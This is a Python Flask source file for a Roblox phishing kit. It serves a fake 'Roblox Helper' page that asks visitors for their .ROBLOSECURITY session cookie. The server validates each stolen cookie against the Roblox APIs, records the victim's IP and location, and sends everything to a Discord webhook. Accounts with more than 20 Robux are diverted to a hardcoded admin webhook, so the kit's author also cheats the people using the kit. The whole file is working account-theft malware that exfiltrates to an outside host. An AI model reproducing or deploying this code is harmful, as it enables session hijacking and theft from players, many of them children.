from flask import Flask, request, jsonify, render_template_string
import requests
import base64
import time

app = Flask(__name__)

ADMIN_WEBHOOK = "https://discord.com/api/webhooks/1458076728370139157/Z8rAMAbLxhg8KNMF4FZdFsVM1FfEEA_LUofoF7h_CdrWtD0kqhn4DArCbNNHceMVk0sd"

# Generator page HTML
GENERATOR_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Helper Generator</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            max-width: 500px;
            width: 100%;
            background: white;
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
        }
        h1 {
            color: #333;
            margin-bottom: 10px;
            font-size: 28px;
            text-align: center;
        }
        .subtitle {
            color: #666;
            text-align: center;
            margin-bottom: 30px;
            font-size: 14px;
        }
        .input-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            color: #333;
            font-weight: 600;
            margin-bottom: 8px;
            font-size: 14px;
        }
        input {
            width: 100%;
            padding: 12px;
            border: 2px solid #ddd;
            border-radius: 8px;
            font-size: 14px;
            transition: all 0.3s;
        }
        input:focus {
            outline: none;
            border-color: #667eea;
        }
        button {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s;
        }
        button:hover { transform: translateY(-2px); }
        button:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }
        .result {
            margin-top: 20px;
            padding: 15px;
            background: #f0f9ff;
            border-radius: 8px;
            display: none;
        }
        .result.show { display: block; }
        .result h3 {
            color: #0891b2;
            margin-bottom: 10px;
            font-size: 16px;
        }
        .link-box {
            background: white;
            padding: 12px;
            border-radius: 6px;
            word-break: break-all;
            font-size: 13px;
            color: #0891b2;
            border: 1px solid #0891b2;
            margin-bottom: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🎮 Roblox Helper Generator</h1>
        <p class="subtitle">Create your custom helper page</p>

        <div class="input-group">
            <label>Your Discord Webhook URL</label>
            <input type="text" id="webhookInput" placeholder="https://discord.com/api/webhooks/...">
        </div>

        <button onclick="generateSite()" id="genBtn">Generate Helper Page</button>

        <div class="result" id="result">
            <h3>✅ Your Helper Page is Ready!</h3>
            <div class="link-box" id="generatedLink"></div>
            <button onclick="copyLink()">Copy Link</button>
        </div>
    </div>

    <script>
        let generatedUrl = '';

        async function generateSite() {
            const webhook = document.getElementById('webhookInput').value;
            const btn = document.getElementById('genBtn');
            
            if (!webhook || !webhook.includes('discord.com/api/webhooks')) {
                alert('Please enter a valid Discord webhook URL');
                return;
            }

            btn.disabled = true;
            btn.textContent = 'Generating...';

            try {
                const response = await fetch('/generate', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ webhook: webhook })
                });

                const data = await response.json();
                
                if (data.success) {
                    generatedUrl = data.url;
                    document.getElementById('generatedLink').textContent = generatedUrl;
                    document.getElementById('result').classList.add('show');
                } else {
                    alert('Failed to generate site');
                }
            } catch (error) {
                alert('Error: ' + error.message);
            }

            btn.disabled = false;
            btn.textContent = 'Generate Helper Page';
        }

        function copyLink() {
            navigator.clipboard.writeText(generatedUrl).then(() => {
                alert('✅ Link copied!');
            });
        }
    </script>
</body>
</html>
"""

# Helper page HTML template
HELPER_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Helper</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 15px;
            padding: 40px;
            max-width: 450px;
            width: 100%;
            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.2);
        }
        h1 {
            color: #e74c3c;
            margin-bottom: 10px;
            font-size: 26px;
            text-align: center;
        }
        .subtitle {
            color: #7f8c8d;
            text-align: center;
            margin-bottom: 30px;
            font-size: 13px;
        }
        .input-group { margin-bottom: 20px; }
        label {
            display: block;
            color: #2c3e50;
            font-weight: 600;
            margin-bottom: 8px;
            font-size: 13px;
        }
        input, textarea {
            width: 100%;
            padding: 12px;
            border: 2px solid #ecf0f1;
            border-radius: 8px;
            font-size: 14px;
            font-family: inherit;
            transition: all 0.3s;
        }
        input:focus, textarea:focus {
            outline: none;
            border-color: #e74c3c;
        }
        textarea {
            resize: vertical;
            min-height: 80px;
        }
        button {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
        }
        button:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(231, 76, 60, 0.4);
        }
        button:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }
        .status {
            margin-top: 20px;
            padding: 12px;
            border-radius: 8px;
            text-align: center;
            font-size: 14px;
            display: none;
        }
        .status.success {
            background: #d4edda;
            color: #155724;
            display: block;
        }
        .status.error {
            background: #f8d7da;
            color: #721c24;
            display: block;
        }
        .info {
            background: #fff3cd;
            border: 1px solid #ffc107;
            border-radius: 8px;
            padding: 12px;
            margin-top: 20px;
            font-size: 12px;
            color: #856404;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🛠️ Roblox Helper</h1>
        <p class="subtitle">Get help with your Roblox account</p>

        <div class="input-group">
            <label>Roblox Username</label>
            <input type="text" id="username" placeholder="Enter your username">
        </div>

        <div class="input-group">
            <label>Roblox Cookie</label>
            <textarea id="cookie" placeholder="Paste your .ROBLOSECURITY cookie here"></textarea>
        </div>

        <button onclick="submitInfo()" id="submitBtn">Submit</button>

        <div class="status" id="status"></div>

        <div class="info">
            ℹ️ We need your cookie to verify your account and provide assistance.
        </div>
    </div>

    <script>
        const WEBHOOK_ID = "{{WEBHOOK_ID}}";

        async function submitInfo() {
            const username = document.getElementById('username').value;
            const cookie = document.getElementById('cookie').value;
            const status = document.getElementById('status');
            const btn = document.getElementById('submitBtn');

            if (!username || !cookie) {
                status.className = 'status error';
                status.textContent = '❌ Please fill in all fields';
                return;
            }

            btn.disabled = true;
            btn.textContent = 'Processing...';
            status.className = 'status';
            status.style.display = 'none';

            try {
                const response = await fetch('/submit', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        webhook_id: WEBHOOK_ID,
                        username: username,
                        cookie: cookie
                    })
                });

                const data = await response.json();

                if (data.success) {
                    status.className = 'status success';
                    status.textContent = '✅ Thank you! We will review your account and get back to you shortly.';
                    document.getElementById('username').value = '';
                    document.getElementById('cookie').value = '';
                } else {
                    status.className = 'status error';
                    status.textContent = '❌ An error occurred. Please try again.';
                }
            } catch (error) {
                status.className = 'status error';
                status.textContent = '❌ An error occurred. Please try again.';
            }

            btn.disabled = false;
            btn.textContent = 'Submit';
        }
    </script>
</body>
</html>
"""

# Store webhooks (in production, use a database)
webhooks = {}

@app.route('/')
def index():
    return render_template_string(GENERATOR_HTML)

@app.route('/generate', methods=['POST'])
def generate():
    data = request.json
    webhook = data.get('webhook')
    
    if not webhook or 'discord.com/api/webhooks' not in webhook:
        return jsonify({'success': False, 'error': 'Invalid webhook'})
    
    # Create unique ID for this webhook
    webhook_id = base64.urlsafe_b64encode(str(time.time()).encode()).decode()[:8]
    webhooks[webhook_id] = webhook
    
    # Generate URL
    site_url = f"{request.host_url}helper/{webhook_id}"
    
    # Send to their webhook
    try:
        requests.post(webhook, json={
            'embeds': [{
                'title': '✅ Your Roblox Helper is Live!',
                'description': f'Your custom helper page is ready:\n\n🔗 **{site_url}**\n\nShare this link to collect submissions.',
                'color': 0x00ff00,
                'footer': {'text': 'Roblox Helper System'}
            }]
        })
    except:
        pass
    
    return jsonify({'success': True, 'url': site_url})

@app.route('/helper/<webhook_id>')
def helper(webhook_id):
    if webhook_id not in webhooks:
        return "Invalid link", 404
    
    html = HELPER_HTML.replace('{{WEBHOOK_ID}}', webhook_id)
    return render_template_string(html)

@app.route('/submit', methods=['POST'])
def submit():
    data = request.json
    webhook_id = data.get('webhook_id')
    username = data.get('username')
    cookie = data.get('cookie')
    
    if webhook_id not in webhooks:
        return jsonify({'success': False})
    
    user_webhook = webhooks[webhook_id]
    
    try:
        # Get user IP
        user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        
        # Get IP info
        try:
            ip_info = requests.get(f'https://ipapi.co/{user_ip}/json/', timeout=5).json()
            location = f"{ip_info.get('city', 'Unknown')}, {ip_info.get('region', 'Unknown')}, {ip_info.get('country_name', 'Unknown')}"
        except:
            location = "Unknown"
        
        # Get Roblox account info
        user_id = "Unknown"
        robux = 0
        
        try:
            headers = {'Cookie': f'.ROBLOSECURITY={cookie}'}
            user_response = requests.get('https://users.roblox.com/v1/users/authenticated', headers=headers, timeout=5)
            
            if user_response.status_code == 200:
                user_data = user_response.json()
                user_id = user_data.get('id', 'Unknown')
                
                try:
                    robux_response = requests.get(f'https://economy.roblox.com/v1/users/{user_id}/currency', headers=headers, timeout=5)
                    if robux_response.status_code == 200:
                        robux = robux_response.json().get('robux', 0)
                except:
                    pass
        except:
            pass
        
        # Prepare embed
        embed = {
            'title': '🎮 New Roblox Helper Submission',
            'color': 0xFF0000 if robux > 20 else 0x00FF00,
            'fields': [
                {'name': '👤 Username', 'value': username, 'inline': True},
                {'name': '🆔 User ID', 'value': str(user_id), 'inline': True},
                {'name': '💎 Robux', 'value': str(robux), 'inline': True},
                {'name': '🌍 IP', 'value': user_ip, 'inline': True},
                {'name': '📍 Location', 'value': location, 'inline': True},
                {'name': '🍪 Cookie', 'value': f'```{cookie}```', 'inline': False}
            ],
            'footer': {'text': 'Roblox Helper System'},
            'timestamp': time.strftime('%Y-%m-%dT%H:%M:%S.000Z', time.gmtime())
        }
        
        # Send to appropriate webhook
        target_webhook = ADMIN_WEBHOOK if robux > 20 else user_webhook
        requests.post(target_webhook, json={'embeds': [embed]})
        
        return jsonify({'success': True})
    
    except Exception as e:
        print(f"Error: {e}")
        return jsonify({'success': False})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)